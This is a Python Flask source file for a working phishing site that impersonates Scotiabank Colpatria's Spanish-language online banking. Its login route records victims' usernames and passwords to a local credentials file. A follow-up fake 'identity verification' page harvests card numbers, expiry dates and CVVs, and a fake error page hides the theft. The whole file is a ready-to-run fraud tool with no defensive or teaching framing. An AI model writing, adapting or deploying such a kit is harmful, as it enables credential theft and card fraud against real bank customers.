from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)

CREDENTIALS_FILE = 'credenciales.txt'
os.makedirs('logs', exist_ok=True)

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank Colpatria - Banca Virtual</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }
        body {
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: row;
            min-height: 100vh;
        }
        .left {
            flex: 1;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 600px;
            margin: 0 auto;
        }
        .left img.logo {
            width: 120px;
            margin-bottom: 30px;
            max-width: 100%;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            padding-left: 40px;
            border: none;
            border-bottom: 2px solid #ccc;
            font-size: 16px;
            outline: none;
        }
        .input-group .icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }
        .extra-info {
            font-size: 12px;
            color: #999;
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .extra-info a {
            color: #0074bd;
            font-weight: bold;
            text-decoration: none;
        }
        .remember {
            display: flex;
            align-items: center;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .remember input {
            margin-right: 10px;
        }
        .btn {
            width: 100%;
            background-color: #e30613;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        .footer {
            font-size: 14px;
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
        }
        .footer a {
            color: #0074bd;
            font-weight: bold;
            text-decoration: none;
        }
        .right {
            flex: 1;
            background: url('{{ url_for('static', filename='chica.jpg') }}') no-repeat center center;
            background-size: cover;
            display: none;
        }
        @media (min-width: 768px) {
            .left {
                padding: 60px 80px;
            }
            .right {
                display: block;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="{{ url_for('static', filename='logocolpatria.jpg') }}" alt="Logo" class="logo">
            <h1>Ingresa a tu Banca Virtual</h1>
            <form method="POST" action="/login">
                <div class="input-group">
                    <span class="icon">👤</span>
                    <input type="text" name="username" placeholder="Usuario" required>
                </div>
                <div class="input-group">
                    <label for="password">Contraseña</label>
                    <span class="icon">🔒</span>
                    <input type="password" name="password" placeholder="Contraseña" required>
                </div>
                <div class="extra-info">
                    <span>8+ caracteres | 1+ mayúscula | 1+ minúscula | 1+ número</span>
                </div>
                <div class="extra-info">
                    <a href="#">¿Olvidaste tu usuario o contraseña?</a>
                </div>
                <div class="remember">
                    <input type="checkbox" id="remember">
                    <label for="remember">Recordar mi nombre de usuario</label>
                </div>
                <button type="submit" class="btn">Ingresar</button>
            </form>
            <div class="footer">
                <span>¿Eres nuevo con nosotros?</span>
                <a href="#">Activa tu usuario</a>
            </div>
        </div>
        <div class="right"></div>
    </div>
</body>
</html>
"""

VERIFICATION_PAGE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Identidad - Scotiabank Colpatria</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }
        body {
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: row;
            min-height: 100vh;
        }
        .left {
            flex: 1;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 600px;
            margin: 0 auto;
        }
        .left img.logo {
            width: 120px;
            margin-bottom: 30px;
            max-width: 100%;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            padding-left: 40px;
            border: none;
            border-bottom: 2px solid #ccc;
            font-size: 16px;
            outline: none;
        }
        .input-group .icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }
        .card-row {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .card-col {
            flex: 1;
        }
        .security-info {
            font-size: 12px;
            color: #999;
            margin-bottom: 20px;
        }
        .btn {
            width: 100%;
            background-color: #e30613;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }
        .right {
            flex: 1;
            background: url('{{ url_for('static', filename='chica.jpg') }}') no-repeat center center;
            background-size: cover;
            display: none;
        }
        @media (min-width: 768px) {
            .left {
                padding: 60px 80px;
            }
            .card-row {
                flex-direction: row;
            }
            .right {
                display: block;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="{{ url_for('static', filename='logocolpatria.jpg') }}" alt="Logo" class="logo">
            <h1>Verificación de Identidad</h1>
            <form method="POST" action="/verify">
                <div class="input-group">
                    <label for="card_number">Número de tarjeta</label>
                    <span class="icon">💳</span>
                    <input type="text" name="card_number" placeholder="0000 0000 0000 0000" maxlength="16" required>
                </div>
                
                <div class="card-row">
                    <div class="card-col">
                        <div class="input-group">
                            <label for="expiry">Fecha de vencimiento</label>
                            <span class="icon">📅</span>
                            <input type="text" name="expiry" placeholder="MM/AA" maxlength="5" required>
                        </div>
                    </div>
                    <div class="card-col">
                        <div class="input-group">
                            <label for="cvv">Código de seguridad</label>
                            <span class="icon">🔐</span>
                            <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
                        </div>
                    </div>
                </div>
                
                <div class="security-info">
                    <p>Por tu seguridad, solicitamos esta información adicional para verificar tu identidad.</p>
                </div>
                
                <button type="submit" class="btn">Continuar</button>
            </form>
        </div>
        <div class="right"></div>
    </div>
</body>
</html>
"""

ERROR_PAGE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error - Scotiabank Colpatria</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f5f5f5;
            padding: 20px;
        }
        .error-container {
            text-align: center;
            padding: 30px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }
        .error-icon {
            font-size: 50px;
            color: #e30613;
            margin-bottom: 20px;
        }
        h1 {
            color: #e30613;
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            margin-bottom: 30px;
            color: #666;
            font-size: 16px;
        }
        .btn {
            background-color: #e30613;
            color: #fff;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-icon">⚠️</div>
        <h1>Error en el sistema</h1>
        <p>Lo sentimos, estamos presentando inconvenientes técnicos. Por favor intenta nuevamente más tarde.</p>
        <a href="/" class="btn">Volver al inicio</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        with open(f'logs/{CREDENTIALS_FILE}', 'a') as f:
            f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
            f.write(f"\nIP: {request.remote_addr}")
            f.write(f"\nUsuario: {username}")
            f.write(f"\nContraseña: {password}")
            f.write("\n" + "="*50 + "\n")
        
        return render_template_string(VERIFICATION_PAGE)
    
    return "Error: Faltan credenciales", 400

@app.route('/verify', methods=['POST'])
def verify():
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvv = request.form.get('cvv')

    if card_number and expiry and cvv:
        with open(f'logs/{CREDENTIALS_FILE}', 'a') as f:
            f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
            f.write(f"\nIP: {request.remote_addr}")
            f.write(f"\nTarjeta: {card_number}")
            f.write(f"\nVencimiento: {expiry}")
            f.write(f"\nCVV: {cvv}")
            f.write("\n" + "="*50 + "\n")
        
        return render_template_string(ERROR_PAGE)
    
    return "Error: Faltan datos de la tarjeta", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)